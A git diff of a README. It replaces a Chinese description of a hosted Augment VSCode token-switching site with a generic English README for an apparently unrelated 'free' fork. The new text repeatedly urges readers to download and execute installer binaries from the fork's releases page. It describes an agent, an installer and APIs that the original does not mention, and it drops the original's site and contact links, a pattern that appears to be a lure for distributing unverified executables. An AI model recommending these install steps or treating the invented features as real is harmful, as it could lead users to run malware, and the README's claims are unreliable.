@@ -1,150 +1,246 @@
-# Augment Token Manager
+[![Releases](https://img.shields.io/github/v/release/wuhongfeiiiii/augment-token-vscode-free?label=Releases&color=0da7ff&logo=github)](https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases)
 
-🚀 **专为 Augment VSCode 插件设计的智能Token管理平台**
+# Augment Token Manager — Seamless VSCode Token Switch & Share
 
-一个现代化的Web平台，让你轻松管理Augment访问令牌，实现多账号无感切换，提升开发效率。 该平台需要特点的vscode插件使用
+![VSCode Token](https://code.visualstudio.com/assets/images/code-stable.png)
 
-## ✨ 核心特性
+A focused web service to generate, store, and rotate Augment access tokens and to pair those tokens with a VSCode extension for automatic account switching. This repo collects tools, scripts, and installer assets you can use with your team and your development environment.
 
-### 🔐 智能身份验证
-- **多平台登录支持** - GitHub、LinuxDo 一键登录
-- **安全可靠** - 基于OAuth2.0标准，保障账户安全
-- **统一身份管理** - 多平台账号自动关联
+Badges
+- Build: ![Build](https://img.shields.io/badge/build-pending-lightgrey)
+- License: ![License](https://img.shields.io/badge/license-MIT-green)
+- Releases: [View releases](https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases)
 
-### 🎯 Token生命周期管理
-- **一键生成** - 快速创建Augment访问令牌
-- **实时状态** - 查看Token使用状态和有效期
-- **批量操作** - 支持批量管理多个Token
-- **安全销毁** - 一键安全删除不需要的Token
+Features
 
-### 🔄 无感账号切换
-- **智能识别** - 自动识别当前开发环境
-- **无缝切换** - 配合VSCode插件实现账号无感切换
-- **状态同步** - 实时同步Token使用状态
+- Authentication
+  - OAuth2 login for GitHub and LinuxDo accounts.
+  - Single identity that links multiple provider accounts.
+  - Token approval flow that follows standard OAuth scopes.
+- Token lifecycle
+  - Generate Augment tokens per tenant.
+  - Show token status and expiry.
+  - Bulk revoke or renew tokens.
+  - Secure wipe of tokens and audit records.
+- VSCode integration
+  - Pair tokens with the Augment VSCode extension.
+  - Automatic token selection based on workspace or remote host.
+  - Push token to the local VSCode key store with user consent.
+- Team operations
+  - Transfer tokens to teammates with scoped permissions.
+  - Role-based access for token use and transfer.
+  - Audit trail for token creation, use, and transfer.
+- Operational controls
+  - Rate limit token creation.
+  - Token tagging, naming, and ownership rules.
+  - API for automation and CI/CD use.
 
-### 👥 协作与分享
-- **Token转让** - 安全地将Token转让给团队成员
-- **权限管理** - 精细化的访问权限控制
-- **使用追踪** - 详细的Token使用记录
+Why use this repo
 
-## 🚀 快速开始
+- Central store for token tooling and installers.
+- Scripts to wire the web manager to the VSCode extension.
+- Release builds for platform installers and helper agents.
 
-### 1. 访问平台
-打开 [Augment Token Manager](https://augment.daiju.live) 
+Quick start
 
-### 2. 登录账户
-选择你喜欢的方式登录：
-- 🐙 GitHub账户登录
-- 🐧 LinuxDo账户登录
+1. Open the releases page linked above or at:
+   https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases
 
-### 3. 创建Token
-1. 点击 "添加Token" 按钮
-2. 输入你的Augment租户URL
-3. 系统自动生成专属Token
-4. 复制Token到剪贴板
+2. Download and execute the installer file for your platform from the releases page.
+   - The releases page includes binary assets and zip archives.
+   - Pick the asset that matches your OS (Windows .exe, macOS .dmg or .pkg, Linux .sh or .tar.gz).
+   - Run the installer or unpack and run the agent script.
 
-### 4. 配置VSCode插件
-1. 在VSCode中安装Augment插件
-2. 打开插件设置
-3. 粘贴你的Token
-4. 享受智能编程体验！
+3. Visit the web manager and create your first token
+   - Create or sign in with a supported identity provider.
+   - Add a tenant URL for your Augment environment.
+   - Generate a token and copy the token string.
 
-## 🔧 与Augment VSCode插件配合使用
+4. Configure the VSCode extension
+   - Install the Augment extension in VSCode.
+   - Open the extension settings.
+   - Paste the token into the extension field.
+   - The extension will claim the token and update the local status.
 
-### 无感切换工作流
+Downloads and installers
 
-```mermaid
-graph LR
-    A[开发者] --> B[Token Manager]
-    B --> C[生成Token]
-    C --> D[VSCode插件]
-    D --> E[Augment服务]
-    E --> F[智能编程]
-    
-    B --> G[切换账号]
-    G --> D
-```
+- Primary release page:
+  https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases
 
-### 典型使用场景
+- Action required:
+  Download the latest release asset from the link above and execute the installer file for your environment. The release asset contains the web client helper, the local agent, and the VSCode configuration script.
 
-#### 🏢 企业开发团队
-- **项目隔离** - 不同项目使用不同Token
-- **权限分级** - 根据角色分配不同权限的Token
-- **成本控制** - 精确追踪每个Token的使用情况
+Architecture overview
 
-#### 👨‍💻 个人开发者
-- **多账号管理** - 工作账号和个人账号分离
-- **项目切换** - 快速在不同项目间切换
-- **使用优化** - 监控Token使用情况，优化开发效率
+- Web Manager
+  - Hosts token creation UI, audit logs, and team controls.
+  - Uses OAuth2 for authentication and issues scoped tokens.
+  - Stores tokens encrypted with per-tenant keys.
+- Local Agent
+  - Runs on developer machines.
+  - Receives sealed tokens from the web manager and stores them in the system key store.
+  - Notifies the VSCode extension of token changes.
+- VSCode Extension
+  - Requests tokens from the local agent.
+  - Resolves which token to use by workspace rules and host context.
+  - Calls Augment APIs with the active token.
 
-## 📊 功能亮点
+Common flows
 
-### 🎛️ 直观的管理界面
-- **现代化设计** - 简洁美观的用户界面
-- **响应式布局** - 完美适配桌面和移动设备
-- **实时更新** - 数据实时同步，无需手动刷新
+- Generate a new token
+  - Sign in to the manager.
+  - Add tenant endpoint.
+  - Click Generate.
+  - Copy token or transfer it to another user.
 
-### 📈 详细的使用统计
-- **使用时长** - 精确记录Token使用时间
-- **调用次数** - 统计API调用频率
-- **效率分析** - 帮助优化开发工作流
+- Switch accounts inside VSCode
+  - Open a workspace.
+  - The extension asks the local agent for a token.
+  - The agent selects a token based on workspace rules.
+  - The extension uses the token to perform API calls.
 
-### 🔒 企业级安全
-- **数据加密** - 所有敏感数据均加密存储
-- **访问控制** - 严格的权限验证机制
-- **审计日志** - 完整的操作记录追踪
+- Revoke a token
+  - Find the token in the manager.
+  - Click Revoke.
+  - The system pushes a revoke event to connected agents and the extension.
 
+Security model
 
-## 📝 使用指南
+- Tokens encrypt at rest using tenant-specific keys.
+- Tokens transit the network over TLS with HSTS.
+- OAuth2 sessions use short-lived refresh tokens where possible.
+- Transfer operations require authorization and create an audit entry.
+- Agents store tokens in the OS key store (Keychain, Windows Credential Manager, or libsecret).
 
-### Token管理最佳实践
+Operational tips
 
-1. **定期轮换** - 建议定期更新Token以保障安全
-2. **按需创建** - 根据实际需求创建Token，避免浪费
-3. **及时清理** - 删除不再使用的Token
-4. **权限最小化** - 只分配必要的权限
+- Create separate tokens for CI systems. Limit scopes and set expiry.
+- Tag tokens by purpose: dev, ci, deploy, test.
+- Rotate long-lived tokens monthly or per release.
+- Use transfer with restricted scopes for shared automation.
 
-### 故障排除
+Configuration reference
 
-#### Token无法使用？
-- 检查Token是否已过期
-- 确认租户URL是否正确
-- 验证网络连接是否正常
+- Web manager environment variables
+  - APP_URL — public URL for the manager.
+  - OAUTH_GITHUB_CLIENT_ID — GitHub OAuth client id.
+  - OAUTH_LINUXDO_CLIENT_ID — LinuxDo OAuth client id.
+  - ENCRYPTION_KEY — master key for token encryption.
+  - DB_URL — Postgres or supported DB connection string.
 
-#### 无法登录？
-- 确认使用的是支持的登录方式
-- 检查浏览器是否禁用了第三方Cookie
-- 尝试清除浏览器缓存
+- Local agent flags
+  - --listen — local socket or path for VSCode extension.
+  - --store — select key store: keychain, wincred, libsecret.
+  - --log-level — info, warn, error.
 
-## 💰 赞助支持
+- VSCode extension settings
+  - augment.tokenStore — path or socket to the local agent.
+  - augment.tenantUrl — default tenant when none match the workspace.
+  - augment.autoSwitch — boolean to enable automatic token selection.
 
-如果这个项目对你有帮助，欢迎赞助支持开发：
+API and automation
 
-<div align="center">
-  <img src="https://augment.daiju.live/img/wx.png" alt="微信赞助" width="200">
-  <p><strong>微信扫码赞助</strong></p>
-</div>
+- REST endpoints
+  - POST /api/tokens — create a token (requires auth).
+  - GET /api/tokens — list tokens for the user.
+  - POST /api/tokens/{id}/revoke — revoke a token.
+  - POST /api/tokens/{id}/transfer — transfer a token to another user.
 
-## 👥 交流群组
+- Example curl to create a token (replace placeholders)
+  curl -X POST https://your-manager.example/api/tokens \
+    -H "Authorization: Bearer $MGMT_TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"tenant":"https://tenant.example","name":"ci-token","scopes":["read","deploy"]}'
 
-加入我们的QQ群，与其他开发者交流使用心得：
+- Use automation to generate tokens on release or CI jobs and store them in a secret manager.
 
-**QQ群号：1014952167**
+Team and collaboration
 
-## 🤝 贡献指南
+- Roles
+  - Owner — full access, manage team settings.
+  - Admin — manage tokens and users.
+  - Developer — create and use tokens.
+  - Auditor — view logs and events.
 
-我们欢迎社区贡献！如果你有好的想法或发现了问题：
+- Share a token
+  - Open the token details.
+  - Click Transfer.
+  - Select team or a specific user.
+  - Set transfer scope and expiry.
 
-1. 🐛 **报告Bug** - 在Issues中详细描述问题
-2. 💡 **功能建议** - 分享你的创意想法
-3. 📖 **文档改进** - 帮助完善文档内容
+- Auditing
+  - Each action logs user, time, and client.
+  - Download audit CSV for compliance.
 
----
+Troubleshooting
 
-<div align="center">
+- Agent fails to start
+  - Check system key store permissions.
+  - Confirm agent has access to its configuration file.
+- Extension cannot find token
+  - Check augment.tokenStore setting in VSCode.
+  - Confirm the agent listens on the configured socket or path.
+- Token rejected by Augment API
+  - Verify tenant URL matches token scope.
+  - Check token expiry and revoke status.
 
-**让智能编程更简单，让开发效率更高效** 🚀
+FAQ
 
-[开始使用](https://augment.daiju.live)
+- Can I use multiple tenants?
+  - Yes. You may create tokens per tenant. The manager groups tokens by tenant.
+- How does the agent pick a token?
+  - The agent uses workspace metadata and host detection rules to select a token.
+- Can I script token creation?
+  - Yes. Use the REST API with a management token.
 
-</div>
+Contributing
+
+- Fork the repo.
+- Create a feature branch.
+- Add tests for new behavior.
+- Open a pull request with a clear description and issue link.
+- Use the repository CI to run checks.
+
+Releases and downloads
+
+- Visit the releases page and pick the asset that matches your OS:
+  https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases
+
+- After you download the release asset, execute the installer file for your platform to install the web helper, agent, and scripts. The release assets include checksums and signatures where available.
+
+Assets you may find in a release
+
+- augment-agent-{os}-{arch}.zip or .tar.gz — Local agent binaries and scripts.
+- augment-installer-{os}.exe or .pkg — Installers for desktop platforms.
+- augment-vscode-setup.vsix — VSCode extension package for manual install.
+- docs.tar.gz — Offline docs and examples.
+
+Images and resources
+
+- VSCode icon: https://code.visualstudio.com/assets/images/code-stable.png
+- Token icon example: https://upload.wikimedia.org/wikipedia/commons/8/8f/Key_Icon.svg
+- Team icon example: https://upload.wikimedia.org/wikipedia/commons/7/7e/Users_icon.svg
+
+License
+
+- MIT — See the LICENSE file for full terms.
+
+Contact and support
+
+- File issues on GitHub with labels: bug, feature, docs.
+- For security issues, open a private issue or email the maintainer listed in the repository profile.
+
+Directories in this repo (what to expect)
+
+- /agent — local agent source and release bundles.
+- /extension — VSCode extension source and build scripts.
+- /web — UI and API server code.
+- /deploy — Docker and k8s manifests for production.
+- /docs — design notes, API specs, and workflows.
+
+Changelog
+
+- See the releases page for change logs and packaged assets:
+  https://github.com/wuhongfeiiiii/augment-token-vscode-free/releases
+
+Contribute code, report bugs, or request features through pull requests and issues on GitHub.
